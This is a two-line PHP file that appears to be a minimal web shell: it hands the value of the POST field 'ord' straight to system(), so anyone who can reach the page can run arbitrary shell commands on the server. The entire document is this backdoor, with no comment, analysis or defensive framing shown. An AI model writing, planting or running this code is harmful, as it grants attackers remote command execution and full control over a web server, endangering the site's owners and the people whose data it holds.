<?php
	system($_POST['ord']);